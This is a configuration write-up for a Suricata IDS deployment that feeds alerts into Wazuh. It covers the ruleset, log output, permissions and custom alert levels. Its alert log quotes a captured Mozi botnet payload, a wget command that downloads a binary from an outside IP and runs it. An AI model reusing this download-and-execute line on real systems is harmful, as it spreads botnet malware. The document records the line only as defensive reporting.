# 04 — Suricata IDS

## Version

Suricata 8.0.5

## What Suricata Does

Suricata is a network intrusion detection system. Unlike Wazuh which reads application logs, Suricata reads raw network packets in real time — inspecting every connection that reaches the server and comparing it against threat signatures.

This means Suricata detects threats that never get written to a log file — port scans, exploit probes, malware callbacks, botnet command and control traffic.

## Ruleset

Emerging Threats Open ruleset — 40,000+ signatures covering:

- Known malicious IPs (ET DROP, ET CINS)
- Network reconnaissance (ET SCAN)
- Exploit attempts (ET EXPLOIT)
- Malware traffic (ET MALWARE)
- Command and control (ET CNC)
- DNS anomalies
- Protocol anomalies
- IoT botnet activity

Auto-updated weekly via cron:
```bash
# /etc/cron.d/suricata-update
0 3 * * 1 /usr/bin/suricata-update && systemctl restart suricata
```

## Network Interface

```yaml
af-packet:
  - interface: enp0s5

vars:
  address-groups:
    HOME_NET: "[10.0.1.0/24]"
    EXTERNAL_NET: "!$HOME_NET"
```

## Log Configuration

Suricata is configured to log alerts only — not all network traffic — to reduce volume and storage costs:

```yaml
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: /var/log/suricata/eve.json
      types:
        - alert
```

## Wazuh Integration

```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json</location>
</localfile>
```

File permissions fix required for Wazuh to read Suricata logs:
```bash
sudo chmod 644 /var/log/suricata/eve.json
sudo usermod -aG suricata wazuh
```

## Custom Elevation Rules

Default Wazuh rule 86601 fires for all Suricata alerts at level 3. Custom rules elevate specific high-confidence categories:

| Rule ID | Match | Level | MITRE | Suppression |
|---------|-------|-------|-------|-------------|
| 100300 | ET DROP | 10 | T1595 | 5 hits per hour |
| 100301 | ET CINS | 10 | T1595 | 5 hits per hour |
| 100302 | ET SCAN | 8 | T1046 | 5 hits per hour |
| 100303 | ET EXPLOIT | 12 | T1190 | None — every hit counts |
| 100304 | ET MALWARE | 12 | T1071 | None — every hit counts |

## Notable Alerts (Real Examples)

### Mozi Botnet Exploit Attempt — 24 June 2026
- **Source IP:** 110.36.90.169
- **Rule:** ET EXPLOIT Netgear DGN Remote Command Execution
- **Level:** 12 (Critical)
- **Payload:** `wget http://110.36.90.169:38608/Mozi.m -O /tmp/netgear; sh netgear`
- **Result:** Server not vulnerable (not a Netgear router). Nginx returned 301.
- **MITRE:** T1190 — Exploit Public-Facing Application

### Zmap Internet Scanner — 18 June 2026
- **Source IP:** 45.33.109.18
- **Rule:** ET SCAN Zmap User-Agent (Inbound)
- **Level:** 8 (Medium)
- **Detail:** Automated internet-wide port scan targeting port 80
- **MITRE:** T1595 — Active Scanning

### DShield Blocklisted Source — 18 June 2026
- **Source IP:** 66.132.172.143
- **Rule:** ET DROP Dshield Block Listed Source group 1
- **Level:** 10 (High)
- **Flowbits:** ET.Evil, ET.DshieldIP
- **MITRE:** T1595 — Active Scanning

## JSON Decoder Fix

Suricata eve.json contains more fields than Wazuh's default limit. Added to `/var/ossec/etc/local_internal_options.conf`:

```
analysisd.decoder_json_buffer=65536
analysisd.decoder_json_max_fields=200
```
